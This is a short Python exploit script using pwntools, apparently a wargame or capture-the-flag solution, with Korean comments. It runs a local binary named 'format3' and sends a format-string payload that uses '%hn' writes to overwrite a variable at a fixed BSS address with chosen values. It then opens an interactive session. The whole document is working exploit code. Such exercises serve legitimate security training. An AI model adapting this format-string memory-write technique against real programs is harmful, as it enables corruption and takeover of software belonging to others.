from pwn import * # pwntools 라이브러리 임포트


p = process('./format3') # 대상 프로그램 실행


target = 0x40404c # target 변수의 주소 지정 (BSS 영역)

payload = b'%258c%13$hn' # target+2에 0x0102(258)를 2바이트로 씀
payload += b'%21570c%14$hn' # target에 0x5544(21570)를 2바이트로 씀
payload += p64(target + 2) # 쓸 주소(target+2) 추가
payload += p64(target) # 쓸 주소(target) 추가

# 페이로드 전송
p.sendline(payload)

# 익스플로잇 후 대화형 세션 시작
p.interactive()
